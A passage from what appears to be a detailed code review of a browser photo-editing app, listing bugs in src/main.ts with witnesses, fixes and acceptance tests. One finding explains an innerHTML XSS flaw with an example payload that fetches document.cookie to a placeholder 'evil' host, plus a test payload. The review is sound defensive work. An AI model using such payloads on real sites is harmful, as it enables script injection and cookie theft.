**Fix constraint.** The drain must keep its per-iteration yield (`await new Promise((r) => setTimeout(r))` at main.ts:2437) - the comment at :2449 states it exists so 'the loupe keeps its frame budget', so serializing against the batch must not remove the yield or the loupe will starve.

---

#### R1-3 — `src/main.ts:2885` (+1 more sites: src/main.ts:4524)

**Untrusted strings reach innerHTML at 2 of the file's 2…**

- Severity: **Critical** · Confidence: high · Source: `[review]` · Category: security · Direction: certifies-falsely
- Anchor: `row.innerHTML = ``

**What's wrong.** An exhaustive sweep found 5 innerHTML/insertAdjacentHTML/outerHTML/document.write matches in src/main.ts: 2 assignments (2885, 4524) and 3 comments warning against exactly this. Both assignments interpolate attacker-influenced data. (1) 2885 renderSmartCollections interpolates smart.name - free text from #smart-name, stored verbatim by createSmartCollection, and restored verbatim by backup.ts:394-397 (store.put(record) with no per-field sanitization). (2) 4524 infoOverlay.innerHTML = info, where info interpolates file.name (a filename from disk) and lastDecoded.make/model (EXIF text). The file states the rule these two break, three times: 1798, 2953, 6310 all read 'DOM-built, never innerHTML: ... user data', and renderCollections 78 lines above site (1) does name.textContent = collection.name for the same class of data.

**Failure scenario.** A user is handed a catalog backup whose smartCollections[0].name is `<img src=x onerror="fetch('//evil/'+document.cookie)">`, or opens a JPEG whose EXIF Make field carries the same payload. renderSmartCollections runs at boot, after every cull write and after every criteria edit; the overlay fires on hovering the loupe's top-left 150x150px. Either executes script in the app's origin with full access to the IndexedDB catalog and to FileSystemFileHandles holding mode:'readwrite' directory grants (main.ts:4063) - enough to exfiltrate or wipe the user's photo directories.

**Witness.** grep -n 'innerHTML|insertAdjacentHTML|outerHTML|document.write' src/main.ts -> 5 matches: 2 assignments (2885, 4524), 3 comments (1798, 2953, 6310). => 2 of 2 innerHTML assignment sites interpolate attacker-influenced data. Repo-wide the only other hit is secondMonitor.ts:88 document.write, whose template literal was counted to contain 0 interpolations.

**Suggested fix.** Build both rows/overlays with createElement + textContent, matching renderCollections directly above. For 2885: create the name/count spans and the edit/delete buttons and row.append(...) them. For 4524: build the <strong> and the metadata lines as elements with textContent. Additionally validate restored string fields in backup.ts rather than putting rows verbatim.

**Fix witness (acceptance criterion).** A test (or QA assertion) that creates a smart collection named `<img src=x onerror=window.__pwned=1>` and a file whose EXIF Make carries the same payload, renders both, and asserts window.__pwned is undefined and the literal text is visible. Must go red if either site reverts to innerHTML.

**Fix constraint.** The surrounding convention is already explicit and must be matched, not reinvented - src/main.ts:1798, :2953 and :6310 each carry a 'DOM-built, never innerHTML: ... user data' comment, and renderCollections (:2807) uses name.textContent for the same class of persisted user-entered name.

---

#### R1-9 — `src/main.ts:4105` (+2 more sites: src/main.ts:4116, src/main.ts:4143)

**Batch export bypasses loadIntoPipeline and never…**

- Severity: **Critical** · Confidence: high · Source: `[review]` · Category: correctness · Direction: certifies-falsely
- Anchor: `pipeline.load(decoded);`

**What's wrong.** The batch calls pipeline.load(decoded)/loadImage(decoded) directly at 4105/4108 and never writes loadedFileId (sweep: zero hits in 4049-4155, against writes at 3311/3367/3399). Four confirmed consequences. (a) The restore at 4141-4143 calls openFile -> loadIntoPipeline, which short-circuits at 3279 `if (loadedFileId === record.id) return true;`, re-uploading nothing; renderOps then dispatches over the LAST batched photo's demosaicedTexture, so the loupe visibly shows the wrong photo under the current photo's sliders - and a subsequent single Export passes its gate at 3894 and writes those pixels to the current photo's filename. (b) openFile:3091 unconditionally calls setSelection([record.id], record.id), collapsing the 50-photo multi-selection to one and hiding #batch-export-row via the subscriber at 4039-4047. (c) syncDodgeMaskToGPU at 4116 early-returns on !dodgeMaskDirty and Pipeline.load resets the mask to neutral 128 (pipeline.ts:343), so each exported file's own dodgeBurn op is never unpacked - offscreenRenderer.ts:63-66 documents this exact trap and does it correctly. (d) setGrainSeed(seedFromPath(record.path)) is never called (it lives only at 3344/3396 inside loadIntoPipeline), so every file exports with the current photo's grain seed while the grid thumbnail - rendered by OffscreenRenderer with the correct seed - visibly disagrees.

**Failure scenario.** In Develop on photo A, select 50 photos and Batch Export. The loop ends with photo #50's textures in the pipeline; the restore's loadIntoPipeline returns true without decoding; renderOps blits #50 into A's canvas with A's crop, sliders and history. The loupe shows the wrong photograph and the WB readout still looks correct, which hides it. Pressing Export now writes photo #50's pixels to A.jpg. The 50-photo selection is also gone. Every exported file with a dodge/burn edit loses it, and all 50 share A's grain pattern.

**Witness.** grep sweeps -> setGrainSeed in src/: offscreenRenderer.ts:72, offscreenRenderer.ts:78, main.ts:3344, main.ts:3396 (both inside loadIntoPipeline; ZERO in the batch handler). loadedFileId in main.ts: 1535 1540 2416 3279 3311 3367 3399 3434 3862 3894 4406 4432 4461 4946 - ZERO hits in 4049-4155. Exact batch lines: 4105 pipeline.load(decoded), 4108 pipeline.loadImage(decoded), 4116 syncDodgeMaskToGPU(), 4117 pipeline.exportImage(ops, ...).

**Suggested fix.** Factor a prepareForExport(record, fileBytes) helper out of loadIntoPipeline owning decode + resizePaintMask + mask repopulation from the op + setGrainSeed + pipeline.load, and have both call it. For the restore, do not route through openFile: set loadedFileId = null, call loadIntoPipeline(rec, openRequestId) directly, then applyOpsToSliders + renderOps, and snapshot/restore getState().selectedIds around the batch. Better still, render batch exports through the existing serialized OffscreenRenderer, which already handles the mask and the seed correctly.

**Fix witness (acceptance criterion).** A QA check that batch-exports 3 seeded files then asserts (1) document.querySelector('#canvas').width and the loupe pixels return to the pre-batch file, (2) the multi-selection count is unchanged, and (3) each exported file's grain/mask matches its own source. Must go red if loadedFileId invalidation is removed.

**Fix constraint.** Orientation must NOT be 'fixed' here - src/gpu/pipeline.ts:271-278 documents that the flip happens in the normalize pass (pipeline.ts:293 flippedDims) so 'every downstream consumer (op chain, canvas blit, histogram, exportImage, ...) is automatically portrait'. main.ts:3328-3329's flippedDims feeds only canvas sizing, resizePaintMask and lastDecoded. The mask-dims consequence of skipping resizePaintMask is real and belongs to the mask fix, not to orientation.

---

#### R1-5 — `src/main.ts:4119`

**Batch-export output names are derived from the basename…**

- Severity: **Critical** · Confidence: high · Source: `[review]` · Category: correctness · Direction: certifies-falsely
- Anchor: `const fileHandle = await dirHandle.getFileHandle(outName, { create: true });`

**What's wrong.** outName = `${record.name.replace(/\.[^.]+$/, '')}.${ext}` discards both the extension and record.path, so it carries no folder component and no uniquifier. getFileHandle(outName, {create:true}) REUSES an existing file rather than failing, and createWritable() with no keepExistingData TRUNCATES it. There is no existence check and no prompt. completed++ runs on every iteration that did not throw, and an overwrite does not throw. Camera mode collapses a pair identically via sidecarFileName. The pair genuinely coexists in one catalog: the import duplicate gate keys on name+size (import.ts:262, duplicates.ts:32-37 lowercases but keeps the full name including extension), so IMG_0001.NEF and IMG_0001.JPG both import; two same-named files from different folders both import whenever their sizes differ - routine when a camera's counter restarts across cards.

**Failure scenario.** A RAW+JPEG shooter selects a card's contents (IMG_0001.NEF, IMG_0001.JPG, DSC_0001.NEF, DSC_0001.NEF from two folders) and batch-exports as JPEG. Four rows produce two distinct output names; the second write truncates the first. The progress bar reads 'Completed 4/4 exports'. The user ships the folder with half the images missing and no indication - and the truncated first file is not in the trash, so it is unrecoverable.

**Witness.** node -e replicating main.ts:4119-4120 and duplicates.ts:32-37 -> edited-mode outNames: ['IMG_0001.jpg','IMG_0001.jpg','DSC_0001.jpg','DSC_0001.jpg']; distinct outputs: 2 of 4 inputs; camera-mode: ['IMG_0001-camera.jpg','IMG_0001-camera.jpg',...]; dup keys (name+size): 4 distinct, so all four rows coexist in one catalog

**Suggested fix.** Disambiguate on the full record path and refuse to truncate silently: keep a `seen` Map of outName -> count before the loop and append -2, -3 on collision (or fold in a short hash of record.path). Safer still, probe for an existing file first and fail that one file loudly rather than truncating it.

**Fix witness (acceptance criterion).** A QA/unit check that batch-exports two catalog rows sharing a basename but differing in path and asserts two distinct files exist on disk and the summary count equals the number of distinct outputs. Must go red if the uniquifier is removed.

**Fix constraint.** Any uniquifier must keep camera mode consistent - src/catalog/sidecar.ts:10-12 derives `${sourceName.replace(/\.[^.]+$/, '')}-${mode}.jpg` from the same basename strip, so the disambiguation has to be applied before sidecarFileName or the pair collides there too.

---

#### R1-12 — `src/main.ts:4266` (+2 more sites: src/main.ts:4284, src/main.ts:4305)

**Wheel-zoom, double-click zoom and middle-drag pan…**

- Severity: **Critical** · Confidence: high · Source: `[review]` · Category: correctness · Direction: fails-closed
- Anchor: `(e.clientX - rect.left) / rect.width,`

**What's wrong.** #canvas is width:100%; height:100%; object-fit:contain (index.html:652-657), so the displayed image occupies only the contain-box inside rect. imagePointUnderCursor (navigator.ts:60-66) applies NO letterbox correction - vx + cursorX * vw - and its inputs are image-normalized, as settled by its sibling panToNavigatorPoint (navigator.ts:49-55) whose parameters are literally named boxX/boxY and which does the correction internally via containBox. main.ts:4452-4457 feeds THAT one box-normalized coords correctly; the wheel handler at 4266 (and dblclick at 4284) feeds it box coords. The pan at 4305 divides by rect.width/rect.height then multiplies by image-fraction view sizes. The file already owns the correct math at eventToBufferPt:947 and eventToMaskPt:988 (Math.min(rect.width/cw, rect.height/ch)), and containBox is exported, imported at main.ts:23, used at 4381, and pinned by navigator.test.ts:25-44.

**Failure scenario.** A 4000x6000 portrait RAW in a 1200x700 loupe box: the image spans 466.67 x 700 CSS px, pillarboxed. Put the cursor at the image's left edge and scroll to zoom - the code feeds box-x 0.3056 where the image-x is 0.0000, so zoomToward anchors 38.9 displayed px away and the image visibly jumps off the cursor; at the right edge the drift is 116.7 px. Clicks in the pillarbox band are accepted as image coordinates with no clamping at all. Separately, a middle-drag pan moves the x axis 2.571x too slowly while y is exactly correct, so a diagonal drag skews and the photo slides out from under the grab point.

**Witness.** node -e arithmetic on a 4000x6000 buffer in a 1200x700 CSS box -> correct contain scale 0.116667 vs code's width-only 0.300000 (error factor 2.5714). imagePointUnderCursor at clientX-rect.left=100: code feeds 0.0833, correct image-x 0.0000, drift 38.9 displayed px; at 483.33: 0.4028 vs 0.2500, drift 71.3 px; at 900: 0.7500 vs 1.0000, drift -116.7 px. Image left edge sits at box-x 0.3056, below which the code still accepts input. Pan: x divides by 1200 but the image spans 466.67 => 2.571x too slow; y divides by 700 and the image spans 700 => 1.000x correct.

**Suggested fix.** Extract one helper using the already-imported containBox and use it at both sites: `function cursorInImage(e) { const rect = canvas.getBoundingClientRect(); const box = containBox(canvas.width / canvas.height, rect.width / rect.height); return [clamp01(((e.clientX - rect.left) / rect.width - box.x) / box.w), clamp01(((e.clientY - rect.top) / rect.height - box.y) / box.h)]; }`. For the pan, divide by rect.width * box.w and rect.height * box.h.

**Fix witness (acceptance criterion).** A navigator.test.ts case for an extracted cursorInImage asserting a pillarboxed portrait maps box-x 0.3056 -> image-x 0 and clamps band clicks, plus a pan-delta case asserting equal scale on both axes. Must go red if the element-box normalization is restored.

**Fix constraint.** panBy clamps to [w/2, 1-w/2] and viewStateToCropFrac re-clamps to [0, 1-w] (src/app/viewState.ts), so a pan cannot drive the image off-canvas - the fix corrects speed and anchoring, and must not remove or double-apply those existing clamps.

---

#### R1-20 — `src/main.ts:4316`

**The middle-click pan is the only one of the file's five…**

- Severity: **Critical** · Confidence: high · Source: `[review]` · Category: correctness · Direction: certifies-falsely
- Anchor: `if (panStart && e.button === 1) {`

**What's wrong.** panStart = null exists on exactly one line (4318), gated on a pointerup carrying button === 1. A sweep of all five drags in the file shows four register pointercancel - crop-overlay (3677), tone-curve (3718), dodge/burn brush (4249, plus pointerleave at 4250), navigator frame (4468) - and the pan is the sole exception, and the only one that also uses setPointerCapture (4300) without a lostpointercapture release. The move handler at 4302-4315 gates only on `if (!panStart) return;`, never on e.buttons, which is what makes a stuck state observable rather than harmless. The file already knows this hazard class and guards it for a different gesture: window blur resets before/after at 4580-4582.

**Failure scenario.** Middle-drag to pan; a system notification, native autoscroll hijack or OS focus steal fires pointercancel mid-drag. Capture is released implicitly but panStart stays non-null forever. Dismiss the notification and merely moving the mouse across the loupe with no buttons held now drags the image around and dispatches a full renderOps per mousemove. The only recovery is to press and release the middle button again - undiscoverable, and an interleaved left-button release never clears it because of the button === 1 gate.

**Witness.** grep -n "addEventListener('pointer|setPointerCapture|releasePointerCapture|lostpointercapture" src/main.ts -> 22 hits, tabulated per feature: crop-overlay down 3636 / move 3658 / up 3676 / CANCEL 3677; tone-curve 3696 / 3710 / 3717 / CANCEL 3718; brush 4232 / 4241 / 4248 / CANCEL 4249 / LEAVE 4250; navigator 4460 / 4466 / 4467 / CANCEL 4468; middle-pan 4296 / 4302 / 4316 (button===1 only) / CANCEL MISSING / LEAVE MISSING / capture set 4300 released 4319. grep -n panStart -> 4295 (decl), 4299 (set), 4303 4305 4306 4310 (read), 4317-4318 (the ONLY clear).

**Suggested fix.** Extract an endPan(e) that clears panStart and releases capture if held, and register it on pointerup, pointercancel and lostpointercapture - matching the brush's pattern at 4248-4250. Additionally gate the move handler on e.buttons so a stuck state cannot pan, and consider a window blur reset mirroring 4580.

**Fix witness (acceptance criterion).** A QA/jsdom check that starts a middle-drag, dispatches pointercancel, then dispatches pointermove with no buttons held, and asserts viewState is unchanged and no render was dispatched. Must go red if the pointercancel listener is removed.

**Fix constraint.** The e.button === 1 gate on pointerup is correct and must stay - an interleaved left-button release should NOT clear a live middle-drag; the fix adds cancellation paths rather than loosening that test.

---

#### R1-19 — `src/main.ts:4898`

**Compare view renders every photo into a hard-coded 800x600…**

- Severity: **Critical** · Confidence: high · Source: `[review]` · Category: correctness · Direction: certifies-falsely
- Anchor: `canvas.width = 800;`

**What's wrong.** loadCompareImage creates a canvas at a fixed 800x600, calls Pipeline.create/load/render, and never calls setCanvasRect (which appears in main.ts only at 2509 and 2521, both inside renderOps). src/shaders/blit.wgsl settles the question the original reporter could not: the vertex stage emits a single full-screen triangle spanning NDC [-1,3]x[-1,3] with uv 0..1 swept across the ENTIRE render target, and the fragment stage samples cropFrac.xy + in.uv * cropFrac.zw. There is no aspect term, no letterbox branch and no min() fit anywhere in the shader; pipeline.ts:657-666 sets no viewport and no scissor; and cropFrac for the canvas blit is the identity [0,0,1,1], written once in the constructor (pipeline.ts:171-177) and never touched on this path. So the whole source texture is stretched across the whole buffer. The loupe path deliberately does the opposite - ensureCanvasSize at 2511-2515 sizes the buffer to the crop aspect precisely because the blit maps the source rect across the whole canvas. .compare-canvas-wrapper canvas { object-fit: contain } only letterboxes an already-distorted bitmap; it cannot undo distortion baked into the pixels.

**Failure scenario.** Select a 3:2 landscape (6000x4000) and a 4:5 portrait and enter Compare. Both are stretched into 4:3 - the landscape is compressed ~11% horizontally, the portrait far worse. The view whose entire purpose is judging framing and crop shows the wrong framing for essentially every photo, since almost nothing is exactly 4:3.

**Witness.** not run - no browser/WebGPU available; the deciding evidence is the shader source and the draw call, both quoted, and they are conclusive without execution. src/shaders/blit.wgsl vs_main emits vec2(-1,-1), vec2(3,-1), vec2(-1,3) with uvs (0,1), (2,1), (0,-1); fs_main samples cropFrac.xy + in.uv * cropFrac.zw. grep -n 'setCanvasRect' src/main.ts -> 2509 and 2521 only, both inside renderOps, so the compare path never sets a fit rect.

**Suggested fix.** Size the buffer from the decoded image's aspect before Pipeline.create (which configures the surface at the canvas's size), mirroring ensureCanvasSize: `const s = Math.min(800 / W, 600 / H); canvas.width = Math.max(1, Math.round(W * s)); canvas.height = Math.max(1, Math.round(H * s));`. Or call setCanvasRect with a fit rect.

**Fix witness (acceptance criterion).** A QA check that renders a known non-4:3 image into Compare and measures a feature's aspect in the output canvas (getImageData) against the source's, asserting they match within a pixel. Must go red if the buffer reverts to a fixed 800x600.

**Fix constraint.** The canvas must be sized BEFORE Pipeline.create - pipeline.ts:222-226 does canvas.getContext('webgpu') then context.configure(...) at the canvas's current size, so resizing afterwards leaves the configured surface at 800x600.

---

#### R1-11 — `src/main.ts:4921`

**Compare view creates a fresh Pipeline - its own…**

- Severity: **Critical** · Confidence: high · Source: `[review]` · Category: correctness · Direction: fails-closed
- Anchor: `const comparePipeline = await Pipeline.create(canvas);`

**What's wrong.** Pipeline.create does navigator.gpu.requestAdapter(), adapter.requestDevice(), canvas.getContext('webgpu'), context.configure() and awaits loadFilmStrips + loadLightLeaks (uploading a 3-layer and a 12-layer rgba8unorm texture array). loadCompareImage binds the result to a local const, uses it four times, and returns Promise<void> - the reference escapes no scope, so destroy() can never be called. The clear at 4873 is el.remove() only, which detaches the DOM but leaves the canvas's configured WebGPU context holding the device reachable. renderCompareView is reached from refreshCullDependents:2089-2094 (every rating/pick/reject write) and from the compare module's onShow at 5187. The only .destroy() call in the whole file is filmstrip.destroy() at 6619 - not a Pipeline. offscreenRenderer.ts:10-18 documents the discipline Compare violates.

**Failure scenario.** Select 4 photos, enter Compare (4 devices), leave, change the selection, re-enter - repeat 5 times and 20 GPUDevices are alive with 20 sets of full-resolution textures (normalizedTexture r32float + demosaicedTexture + opA/opB rgba16float; for the 61MP case pipeline.ts:210-212 cites, ~1.7 GB per pipeline). Chrome's per-process live-context cap then evicts the OLDEST context - the Develop loupe's - or requestDevice starts failing, which fires the main pipeline's device-loss handler (whose recovery is itself broken, see R1-13). Rating photos with the 1-5 keys while in Compare allocates four devices per keypress.

**Witness.** grep -n 'Pipeline.create' src/main.ts -> 381 (a comment), 1461 (module-level, kept), 1478 (recovery, assigned to `pipeline`), 4921 (LOCAL const, never destroyed). grep -n '\.destroy()' src/main.ts -> 6619 filmstrip.destroy() only - the single .destroy() call in the file, and it is not a Pipeline.

**Suggested fix.** Keep a module-level comparePipelines array, destroy() and clear it at the top of renderCompareView before el.remove(), zero each canvas's width/height to free the bitmap, and wrap loadCompareImage's body in try/finally with a generation counter so a stale entry destroys itself. Better: render each tile through the existing serialized OffscreenRenderer into an <img>, the pattern the contact sheet and thumbnail queue already use.

**Fix witness (acceptance criterion).** A QA check that enters and leaves Compare 5 times and asserts the live GPUDevice/context count does not grow monotonically, or a unit test on an extracted renderCompareView asserting destroy() is called once per created Pipeline. Must go red if the tracking array is removed.

**Fix constraint.** Note src/gpu/pipeline.ts:1065-1081 destroy() does NOT call this.device.destroy() - so adding destroy() calls alone may not release the adapter/device. The fix has to confirm the device itself is released, not only the textures.

---

#### R1-18 — `src/main.ts:5207`

**The Contact sheet's 'previous sheet' button decrements the…**

- Severity: **Critical** · Confidence: high · Source: `[review]` · Category: correctness · Direction: certifies-falsely
- Anchor: `contactSheetIdx--;`

**What's wrong.** contactPrev's if-body decrements contactSheetIdx and then does nothing; the blank line at 5210 is exactly where the render call belongs, and contactNext three lines below does call it. renderContactSheet (4731-4741) is the only thing that clamps the index, recomputes contactSheetLabel, sets both buttons' disabled state, paints the frames (4750 sheets[contactSheetIdx]) and numbers them (4771). A full caller sweep found no subscriber or observer reacting to the index itself. Two further consequences the original claim missed: exportContactSheet names the download contact-sheet-${contactSheetIdx + 1}.png (4860) while rasterizing the STALE DOM, so after a Prev click the filename and the contents disagree; and repaintGrid at 2062 will suddenly materialize the moved index on any unrelated cull keypress or filter change, so the sheet jumps under a keystroke that had nothing to do with paging.

**Failure scenario.** Import 80 frames (3 sheets), open Contact, click Next - sheet 2 shows. Click Prev: the label still reads 'Sheet 2 / 3' and the grid still shows sheet 2. Click Next and sheet 2 renders again (the index went 1->0->1), which reads as a missed click; sheet 1 is now unreachable by paging and can only be recovered by leaving and re-entering the module (onShow resets the index at 5179). Click Export after a Prev and the downloaded file is named contact-sheet-1.png while containing sheet 2's frames.

**Witness.** not run - no browser; the two handlers quoted side by side are decisive. grep -n renderContactSheet src/main.ts -> 2062 (inside repaintGrid, gated on the contact module), 4731 (definition), 5179 (the module's onShow, which first resets contactSheetIdx = 0), 5215 (contactNext), 5218 (contactSource change). No subscriber and no observer on the index. grep -n contactSheetIdx -> 9 hits, none of which re-renders on change.

**Suggested fix.** `contactPrev.addEventListener('click', () => { if (contactSheetIdx > 0) { contactSheetIdx--; renderContactSheet(); } });`

**Fix witness (acceptance criterion).** A QA check that renders 3 sheets, clicks Next then Prev, and asserts contactSheetLabel reads 'Sheet 1 / 3' and the painted frames are sheet 1's. Must go red if the renderContactSheet() call is removed.

---

#### R1-16 — `src/main.ts:5578`

**The 'a modal dialog is open, ignore shortcuts' guard…**

- Severity: **Critical** · Confidence: high · Source: `[review]` · Category: correctness · Direction: certifies-falsely
- Anchor: `if (removeDialog.open) return;`

**What's wrong.** The guard's own comment names exactly this hazard: 'While the Remove dialog is modal, keyboard focus lives inside it and its buttons own the interaction; a stray B/Delete keydown must not re-open (showModal on an open dialog throws) or B-toggle behind it.' But syncDialog (a const inside the same init() body at 5779, showModal at 5832) and smartDialog (module scope 328, showModal at 6201) are never checked. isEditable does not cover this: both dialogs contain plain <button>s (#sync-go, #sync-cancel, #smart-save, .dialog-close), and a focused button - or the <dialog> itself, or <body> after the focused element is disabled - is not an editable target. The Sync path is worst because runSync yields on `await new Promise((r) => setTimeout(r))` per target (5908), so the dialog stays open for the whole batch while the selection is mutated behind it.

**Failure scenario.** Select 3 photos, press S to open Sync, click the Sync button (which disables itself, dropping focus to the dialog). While the batch runs, press x: keyToAction returns {type:'reject'}, the removeDialog guard is false, and the cull branch at 5670-5676 calls setCull for all three - they are flagged rejected in IndexedDB and in memory behind the open dialog, and refreshCullDependents repaints the grid behind it. Press Delete instead and openRemoveDialog stacks a SECOND modal on top (a different element, so no throw), from which the user can delete files from disk. Press g or e and switchModule changes the module underneath the still-open dialog, which never closes it.

**Witness.** not run - no browser was launched; the witness is a complete static dispatch chain with every link quoted (handler 5553 -> keyToAction 5554 -> guard 5578 -> cull branch 5670-5676 -> setCull 5691), plus node_modules/typescript/lib/lib.dom.d.ts:17627 confirming HTMLDialogElement.open is a real property, so the existing guard works as written for the one dialog it covers.

**Suggested fix.** Generalise the guard: `if (removeDialog.open || syncDialog.open || smartDialog.open) return;`, or better `if (document.querySelector('dialog[open]')) return;` so the next dialog added cannot forget it. Hoist the syncDialog query to module scope beside removeDialog/smartDialog - it is currently declared at 5779, AFTER this handler is registered at 5553, which is safe only because no keydown can fire before 5779 executes.

**Fix witness (acceptance criterion).** A QA check that opens the Sync dialog, focuses #sync-go, dispatches keydown 'x', and asserts no setCull write landed and the selection's flags are unchanged. Must go red if the guard reverts to removeDialog only.

**Fix constraint.** Escape must keep reaching the dialogs natively - the existing comment at :5577 states 'Escape reaches the dialog natively (not through this handler)', so the guard must remain an early return that does not preventDefault, or native dialog dismissal breaks.

---

#### R1-15 — `src/main.ts:6580`

**A second, independent document-level keydown dispatcher…**

- Severity: **Critical** · Confidence: high · Source: `[review]` · Category: correctness · Direction: certifies-falsely
- Anchor: `if (e.key === 'F11' || (e.key === 'f' && !e.ctrlKey && !e.metaKey && !e.altKey)) {`

**What's wrong.** This handler bypasses keyToAction() and therefore bypasses the isEditable() guard in src/app/shortcuts.ts:53-58 that every other shortcut relies on - a guard pinned by three tests in shortcuts.test.ts (68, 75, 110) and re-derived a third time inline at main.ts:5566 with a comment explaining why. It checks ctrlKey/metaKey/altKey but not the target, not getState().module, and not any dialog's .open. Reachable text fields are plentiful and live in the module the search box is used in: #search-input (index.html:2115), #keyword-input (2160), the six IPTC text boxes (2181-2201), #smart-name (2808). Note two corrections to the original claim: the test is e.key === 'f' with no toLowerCase(), and Shift produces e.key === 'F', so capital F does NOT fire; and this handler does not call preventDefault(), so the character still lands in the field - the harm is the action firing, not lost input. e.repeat is not checked (unlike the sibling at 4572), and there is no unhandledrejection handler anywhere in the app, so holding 'f' produces overlapping rejecting requestFullscreen() calls - console noise only.

**Failure scenario.** The user types 'fujifilm' into the Search box. The first 'f' keydown toggles the whole app into browser fullscreen mid-typing; a later 'f' in the same string toggles it back out. The characters all still land in the field, so the user gets a search term they did not see themselves type plus two unrequested viewport changes. The same fires while the Remove or Sync dialog is modal, since neither .open is checked here.

**Witness.** grep -n "addEventListener('keydown'" src/main.ts -> 8 sites, tabulated: 399 (window, Escape only, no PD), 3960 (window, Ctrl+Shift+P chord, no PD), 4324 (window, 'z', NO guard, PD at 4328), 4571 (window, '\\', NO guard, PD at 4573), 5553 (the dispatcher, guarded by keyToAction->isEditable plus an inline guard at 5566), 6325 (keyword row, target-scoped), 6418 (#keyword-input itself, intentional), 6580 (document, F11 or 'f', NO module gate, NO guard). src/app/shortcuts.ts:53-58 isEditable is module-private and NOT exported, so main.ts could not import it even if it tried.

**Suggested fix.** Export isEditable from src/app/shortcuts.ts and use it in all three unguarded handlers, or route this one through keyToAction. Add a module/dialog gate and an e.repeat check, and handle the fullscreen promise rejection: `const p = document.fullscreenElement ? document.exitFullscreen() : document.documentElement.requestFullscreen(); p.catch((err) => showError("Couldn't toggle fullscreen.", errorDetail(err)));`

**Fix witness (acceptance criterion).** A shortcuts.test.ts-style case (or QA check) that focuses #search-input, dispatches keydown 'f', and asserts document.fullscreenElement is still null and the field's value is 'f'. Must go red if the editable guard is removed.

**Fix constraint.** shortcuts.test.ts already pins the guard as a contract ('does not fire when focus is in an input, select, or textarea', ':75 ... on content editable elements', ':110 B family respects the editable-focus guard'), and main.ts:5566 carries a third inline copy whose comment warns that 'typing 0 in the stack-gap input must not clear a rating' - consolidate on the tested export rather than adding a fourth copy.
### Suggestion (16)

#### R1-21 — `src/main.ts:902` (+2 more sites: src/main.ts:3639, src/main.ts:3663)

**The crop overlay's dispScale is the width-only ratio…**

- Severity: **Suggestion** · Confidence: high · Source: `[review]` · Category: correctness · Direction: fails-closed
- Anchor: `const dispScale = rect.width > 0 ? rect.width / canvas.width : 1;`

**What's wrong.** The same byte-identical expression appears at 902 (drawCropOverlay, feeding lw = Math.max(1, 1.5/dispScale) at 906 and hs = Math.max(8, 12/dispScale) at 920), 3639 (crop pointerdown) and 3663 (crop pointermove). Under object-fit:contain the true CSS-px-per-buffer-px is Math.min(rect.width/cw, rect.height/ch) - which eventToBufferPt at 947 in the same file already computes. The Math.max(8, ...) floor is in BUFFER px so it does not protect CSS size either (8 buffer px = 0.93 CSS px in the worked example). Verified mitigation that lowers this below R1-12: all three sites use the identical expression and cropHandleAt at 3646 is fed the same hs the drawing used, over buffer coords eventToBufferPt converts correctly - so the hit test AGREES with the drawing and the handles are consistently undersized, not ungrabbable.

**Failure scenario.** A 4000x6000 portrait RAW in a 1200x700 loupe box: correct contain scale 0.116667, code's dispScale 0.300000 (2.57x too large). lw = 5 buffer px renders at 0.583 CSS px against an intended 1.5; hs = 40 buffer px renders at 4.667 CSS px against an intended 12. The crop frame and thirds grid are sub-pixel and effectively invisible on every portrait photo - roughly half of all frames - which is precisely the 'invisible frame, ungrabbable handles' outcome the comment at 896-900 says this scaling exists to prevent.

**Witness.** node -e on a 4000x6000 buffer in a 1200x700 CSS box -> correct contain scale 0.116667 vs code 0.300000, error factor 2.5714; lw = 5.000 buffer px -> 0.583 CSS px (intended 1.5); hs = 40.000 buffer px -> 4.667 CSS px (intended 12); lw/hs if the correct scale were used: 12.86 / 102.86 buffer px. index.html:652-657 confirms #canvas { width:100%; height:100%; object-fit:contain; display:block }.

**Suggested fix.** Extract one helper and use it at all three sites, removing the triplication: `function displayScale(): number { const r = canvas.getBoundingClientRect(); if (!canvas.width || !canvas.height || !r.width || !r.height) return 1; return Math.min(r.width / canvas.width, r.height / canvas.height); }`. It should share the containBox math R1-12's fix introduces.

**Fix witness (acceptance criterion).** A QA check that renders the crop overlay for a portrait image and measures the drawn line weight and handle radius in CSS px via getImageData, asserting they match the intended 1.5 and 12. Must go red if dispScale reverts to the width-only ratio.

**Fix constraint.** src/gpu/crop.ts:92-95 documents the contract the caller must satisfy - 'hs = handle radius in buffer px. The caller derives it from the DISPLAY scale (fixed CSS px / dispScale) so the grab zone stays grabbable' - so the drawing and the hit test must keep using the SAME corrected factor or handles become ungrabbable, which is worse than undersized.

---

#### R1-22 — `src/main.ts:1303`

**opsToLabel renders light-leak patterns 2 and 3 with an…**

- Severity: **Suggestion** · Confidence: high · Source: `[review]` · Category: correctness · Direction: certifies-falsely
- Anchor: `const pat = op.pattern === 0 ? ' · Set A' : op.pattern === 1 ? ' · Set B' : '';`

**What's wrong.** The light-leak vocabulary is five values but the label maps two. Patterns 2 and 3 fall into the '' arm, which is also the -1 (Auto) arm. A sibling arm in the SAME function does render its full vocabulary - the frame arm at 1306-1308 covers all three reachable FrameStyle values - so this is an inconsistency, not a house convention. A fourth site carries the same truncated vocabulary: src/catalog/types.ts:127's comment reads 'pattern -1 auto, 0 Set A, 1 Set B', so the type declaration itself does not know Set C/D exist. Shares a root with R1-1 but is NOT subsumed by its fix: widening isValidOp stops the data loss while leaving these rows loading correctly and then labelling wrongly. The root is that the 4-value set vocabulary is declared in lightleak.ts but re-hardcoded piecemeal by four consumers.

**Failure scenario.** The user edits a photo with 'Set C - punchy' at amount +20 and hue 30, then opens the History panel or the preset list. The row reads 'Light leak +20 · Color 30', identical to an Auto row. Two visually different edits are indistinguishable, and the user cannot tell which history step or which saved preset will restore Set C.

**Witness.** not run - the deciding fact is a three-branch ternary read against a five-value vocabulary; opsToLabel is a module-level function in main.ts and cannot be imported without executing its DOM side effects. Quotes: main.ts:1302-1305 (the ternary), index.html:2490-2495 (five options), src/gpu/lightleak.ts:26 ('-1 auto (seed picks the set), 0 Set A, 1 Set B, 2 Set C, 3 Set D'), lightleak.ts:43 (clamps 0..3), main.ts:1306-1308 (the frame arm, 3 of 3), src/catalog/types.ts:127 (the type comment, 2 of 4).

**Suggested fix.** Export one LIGHTLEAK_PATTERN_NAMES map from src/gpu/lightleak.ts and derive the label from it: `const pat = LIGHTLEAK_PATTERN_NAMES[op.pattern] ? ` · ${LIGHTLEAK_PATTERN_NAMES[op.pattern]}` : '';`. Consume the same map in isValidOp (fixing R1-1) and correct the types.ts comment, so all four consumers read one declaration.

